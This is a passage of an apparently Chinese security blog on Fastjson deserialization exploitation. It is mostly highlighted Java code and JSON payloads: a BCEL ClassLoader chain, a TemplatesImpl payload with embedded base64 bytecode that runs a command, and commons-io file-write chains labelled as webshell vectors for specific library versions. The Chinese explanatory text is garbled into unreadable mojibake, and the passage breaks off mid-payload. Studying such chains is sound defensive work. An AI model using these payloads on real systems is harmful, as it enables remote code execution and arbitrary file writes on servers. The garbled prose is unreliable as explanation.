class_">BasicDataSource</span>();</span><br><span class="line">        basicDataSource.setDriverClassLoader(<span class="keyword">new</span> <span class="title class_">ClassLoader</span>());</span><br><span class="line">        basicDataSource.setDriverClassName(encode);</span><br><span class="line">        basicDataSource.getConnection();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨å†™æˆjsonçš„å½¢å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelLoad</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span>  Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;\&quot;$$BCEL$$&quot;</span> + encode + <span class="string">&quot;\&quot;,\&quot;driverClassloader\&quot;:&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="TemplatesImplé“¾"><a href="#TemplatesImplé“¾" class="headerlink" title="TemplatesImplé“¾"></a>TemplatesImplé“¾</h3><p>è¿™é‡Œå…ˆå»çœ‹çœ‹TemplatesImplåŠ è½½å­—èŠ‚ç çš„ç”¨æ³•<a href="https://www.yuque.com/zqiangweihuakai/ybltae/qlir1pya36gtghqn">java åŠ¨æ€åŠ è½½å­—èŠ‚ç </a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">EvilClass</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilClass</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64.Encoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filepath</span> <span class="operator">=</span> <span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/FastjsonStu/target/test-classes/org/example/EvilClass.class&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filepath);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span>((n = fis.read(b))!=-<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(b,<span class="number">0</span>,n);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">            bos.close();</span><br><span class="line">            buffer = bos.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> encoder.encodeToString(buffer);</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ç”Ÿæˆçš„æ¶æ„å­—èŠ‚ç çš„æµç¨‹</p><p>è¿™é‡Œæˆ‘å…ˆè´´å‡ºç½‘ä¸Šçš„payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABdMb3JnL2V4YW1wbGUvRXZpbENsYXNzOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAJZXZpbENsYXNzBwAuAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAIAAkHAC8MADAAMQEAEm9wZW4gLWEgQ2FsY3VsYXRvcgwAMgAzAQAVb3JnL2V4YW1wbGUvRXZpbENsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAAAwABAANAA0ADgAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABMADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAPAAAABAABABcAAQARABgAAgAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABYADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAZABoAAgAAAAEAGwAcAAMADwAAAAQAAQAXAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAABkACAAaAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABACIAAQAjAAAAAgAk\n\&quot;],&#x27;_name&#x27;:&#x27;exp&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br><span class="line">JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ¥è°ƒè¯•ä¸€éæ‰§è¡Œæµç¨‹</p><p>åœ¨å‰é¢çš„åˆ†æè¿‡ç¨‹ä¸­æˆ‘ä»¬çŸ¥é“äº†åœ¨ä½¿ç”¨parseObjectè¿›è¡Œjsonååºåˆ—åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨ å¯¹åº”ç±»çš„get å’Œ setæ–¹æ³•</p><p>æ‰€ä»¥è¿™é‡Œå¯ä»¥æ‰¾åˆ°TemplatesImplç±»é‡Œçš„è§¦å‘ç‚¹äº‹getOutputPropertiesæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733560419701-03376ca9-afdb-44c5-bcee-58ddde960955.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨äº†newTransformeræ–¹æ³•æ‰€ä»¥åé¢çš„æ‰§è¡Œæµç¨‹å°±å¾ˆæ˜ç¡®äº†ç›´æ¥å‚è€ƒTemplatesImplåŠ¨æ€åŠ è½½å­—èŠ‚ç å°±å¯ä»¥äº†ã€‚è¿™æ¡é“¾å­å±äºæ¯”è¾ƒéš¾åˆ©ç”¨çš„ç‚¹å› ä¸ºå…¶èµ‹å€¼çš„å±æ€§éƒ½æ˜¯privateæ‰€ä»¥éœ€è¦å¼€å¯é…ç½®é€‰é¡¹ã€‚</p><h3 id="Commons-io-å†™æ–‡ä»¶-webshell"><a href="#Commons-io-å†™æ–‡ä»¶-webshell" class="headerlink" title="Commons-io å†™æ–‡ä»¶&#x2F;webshell"></a>Commons-io å†™æ–‡ä»¶&#x2F;webshell</h3><p>æˆ‘è¿™é‡ŒæŠŠpocå¤åˆ¶è¿‡æ¥</p><h4 id="Jre8-åŸå§‹poc"><a href="#Jre8-åŸå§‹poc" class="headerlink" title="Jre8 åŸå§‹poc"></a>Jre8 åŸå§‹poc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;out&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span>,</span><br><span class="line">            <span class="string">&quot;out&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.io.FileOutputStream&quot;</span>,</span><br><span class="line">                <span class="string">&quot;file&quot;</span>:<span class="string">&quot;/tmp/dest.txt&quot;</span>,</span><br><span class="line">                <span class="string">&quot;append&quot;</span>:<span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;infl&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;input&quot;</span>:<span class="string">&quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;bufLen&quot;</span>:<span class="number">1048576</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;protocolVersion&quot;</span>:<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="commons-io-2-0-2-6-ç‰ˆæœ¬ï¼š"><a href="#commons-io-2-0-2-6-ç‰ˆæœ¬ï¼š" class="headerlink" title="commons-io 2.0 - 2.6 ç‰ˆæœ¬ï¼š"></a>commons-io 2.0 - 2.6 ç‰ˆæœ¬ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">            <span class="string">&quot;reader&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;charSequence&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa...(é•¿åº¦è¦å¤§äº8192ï¼Œå®é™…å†™å…¥å‰8192ä¸ªå­—ç¬¦)&quot;</span></span><br><span class="line">                               &#125;,</span><br><span class="line">                <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bufferSize&quot;</span>:<span class="number">1024</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>,</span><br><span class="line">                <span class="string">&quot;writer&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;file&quot;</span>:<span class="string">&quot;/tmp/pwned&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;encoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;append&quot;</span>: <span class="literal">false</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bufferSize&quot;</span>: <span class="number">1024</span>,</span><br><span class="line">                <span class="string">&quot;writeImmediately&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;trigger&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;is&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">                <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;trigger2&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;is&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">                <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;trigger3&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;is&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">                <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="commons-io-2-7-2-8-0-ç‰ˆæœ¬ï¼š"><a href="#commons-io-2-7-2-8-0-ç‰ˆæœ¬ï¼š" class="headerlink" title="commons-io 2.7 - 2.8.0 ç‰ˆæœ¬ï¼š"></a>commons-io 2.7 - 2.8.0 ç‰ˆæœ¬ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">            <span 